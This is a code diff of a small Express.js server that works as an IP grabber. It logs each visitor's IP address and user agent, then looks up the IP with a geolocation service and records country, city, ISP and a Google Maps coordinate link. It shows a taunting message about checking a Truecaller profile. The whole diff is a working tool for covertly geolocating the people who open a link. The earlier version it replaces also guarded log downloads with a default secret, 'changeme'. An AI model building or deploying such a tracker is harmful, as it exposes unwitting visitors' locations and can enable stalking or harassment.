@@ -1,79 +1,71 @@
-const express = require('express');
-const fs = require('fs');
-const path = require('path');
+const express = require("express");
+const fs = require("fs");
+const path = require("path");
+const axios = require("axios");
+
 const app = express();
+
+const logFilePath = path.join(__dirname, "logs", "ips.log");
 const PORT = process.env.PORT || 3000;
 
-// If hosted behind proxy (Render, Railway, etc.)
-app.set('trust proxy', true);
+// Make sure logs folder exists
+if (!fs.existsSync(path.join(__dirname, "logs"))) {
+    fs.mkdirSync(path.join(__dirname, "logs"));
+}
 
-// Ensure logs directory exists
-const LOG_DIR = path.join(__dirname, 'logs');
-if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
-const LOG_FILE = path.join(LOG_DIR, 'ips.log');
+// Function to log to file
+function logToFile(text) {
+    fs.appendFile(logFilePath, text + "\n", (err) => {
+        if (err) console.error("Error writing log:", err);
+    });
+}
 
-// HTML Page
-const html = `<!doctype html>
-<html>
-  <head>
-    <meta charset="utf-8" />
-    <title>y r u checking my truecaller profile?</title>
-    <style>
-      body {
-        margin: 0;
-        font-family: Arial, sans-serif;
-        height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        background: #f2f2f2;
-      }
-      .card {
-        background: white;
-        padding: 32px;
-        border-radius: 14px;
-        box-shadow: 0 4px 18px rgba(0,0,0,0.1);
-        text-align: center;
-      }
-      h1 { margin: 0 0 10px; }
-      p { color: #555; margin: 0; }
-    </style>
-  </head>
-  <body>
-    <div class="card">
-      <h1>y r u checking my truecaller profile?</h1>
-      <p>(your visit has been logged)</p>
-    </div>
-  </body>
-</html>`;
- 
-// Log IP + UA + time
-app.get('/', (req, res) => {
-  const ip = req.ip;
-  const ua = req.get('User-Agent') || 'unknown';
-  const timestamp = new Date().toISOString();
+app.get("/", async (req, res) => {
+    let ip =
+        req.headers["x-forwarded-for"] ||
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress;
 
-  const logEntry = `${timestamp} - IP: ${ip} - UA: ${ua}\n`;
+    // normalize IPv6 localhost
+    if (ip === "::1" || ip === "127.0.0.1") {
+        ip = "LOCALHOST";
+    } else if (ip.includes("::ffff:")) {
+        ip = ip.replace("::ffff:", "");
+    }
 
-  fs.appendFile(LOG_FILE, logEntry, (err) => {
-    if (err) console.error("Error logging IP:", err);
-  });
+    const ua = req.headers["user-agent"] || "Unknown Device";
+    const timestamp = new Date().toISOString();
 
-  res.set('Cache-Control', 'no-store');
-  res.send(html);
+    let geo = {
+        country: "Unknown",
+        region: "Unknown",
+        city: "Unknown",
+        isp: "Unknown"
+    };
+
+    if (ip !== "LOCALHOST") {
+        try {
+            const response = await axios.get(`http://ip-api.com/json/${ip}`);
+            geo = response.data;
+        } catch (err) {
+            console.error("Geo lookup failed");
+        }
+    }
+
+    const logText = `
+[${timestamp}]
+IP: ${ip}
+Country: ${geo.country}
+Region: ${geo.regionName}
+City: ${geo.city}
+ISP: ${geo.isp}
+Maps: https://www.google.com/maps/search/?api=1&query=${geo.lat},${geo.lon}
+UA: ${ua}
+-----------------------------`;
+
+    logToFile(logText);
+
+    res.send("<h1>y r u checking my truecaller profile</h1>");
 });
 
-// Simple log download endpoint
-app.get('/download-logs', (req, res) => {
-  const secret = process.env.LOG_SECRET || "changeme";
-
-  if (req.query.secret !== secret)
-    return res.status(403).send("Forbidden");
-
-  res.download(LOG_FILE);
-});
-
-// Start server
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
+app.listen(PORT, () => console.log(`Running on port ${PORT}`));
